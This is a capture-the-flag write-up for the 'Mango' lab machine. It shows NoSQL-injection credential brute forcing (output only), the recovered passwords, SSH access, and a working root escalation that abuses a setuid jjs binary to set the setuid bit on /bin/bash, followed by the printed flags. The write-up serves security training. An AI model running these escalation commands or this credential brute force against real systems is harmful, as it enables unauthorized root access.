# Mango
>Author : Xyan1d3
>Date : 16th July 2021
>IP : 10.10.10.162
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql

```

## Web Enumeration
The page `http` page gives us a `403 Forbidden`.
But, The `https` site presents us with an self signed SSL Certificate which leaks a domain name.
![[Pasted image 20210716232146.png]]

We add those entries on our `/etc/hosts` file.

We have some credentials but it does not work.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mango/nosqli]
└──╼ # python3 nosqli.py 
[+] Username Length : 5

[*] Trying admin
[+] Password Length : 12

[*] Trying t9KcS3>!0B#2
```

So, We may try some other username by blacklisting the `a` character in the 1st username bruteforce.
```python
┌─[Magisk@Xyan1d3]─[17.17.17.9]─[~/htb/mango]
└──╼ # python3 nosqli/nosqli.py 
[+] Username Length : 5

[*] Trying mango
[+] Password Length : 16

[*] Trying h3mXK8RhU~f{]f5H
```

## Credentials
|Username|Password|
|--|--|
|admin|`t9KcS3>!0B#2`|
|mango|`h3mXK8RhU~f{]f5H`|

# Initial FootHold as mango
We could now `SSH` into the box using the credentials `mango` and `h3mXK8RhU~f{]f5H`.
![[Pasted image 20210717121222.png]]

```python
Last login: Fri Jul 16 21:44:55 2021 from 10.10.14.7
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
mango@mango:~$ whoami
mango
```

# User Escalation as admin
We use the credentials of the `admin` user and `su` into the box.
```python
mango@mango:~$ su - admin
Password: 
$ bash -i
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/home/admin$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
admin@mango:/home/admin$ whoami
admin
```

## Getting the user Flag
```python
admin@mango:/home/admin$ ls -l
total 4
-r-------- 1 admin admin 33 Jul 16 17:42 user.txt
admin@mango:/home/admin$ cat user.txt 
a671b91e255d0e9baaee53e8b44a1535
```

# Root Escalation
We check for all the `setuid` binaries on the box and find out that we have a `jjs` binary which has the `setuid` capability.
```python
admin@mango:/home/admin$ find / -perm /4000 2> /dev/null

*** SNIP ***

/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

*** SNIP ***
```

We could abuse the `setuid` capability and get escalated to `root`.
```python
admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod +s /bin/bash').waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod +s /bin/bash').waitFor()
0
jjs> admin@mango:/home/admin$ bash -p
bash-4.4# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) egid=0(root) groups=0(root),1001(admin)
bash-4.4# whoami
root
```

## Getting the root Flag
```python
bash-4.4# cd /root/
bash-4.4# ls -l
total 4
-r-------- 1 root root 33 Jul 16 17:42 root.txt
bash-4.4# cat root.txt 
a3355880ed3c681aeab23746c60ddba5
```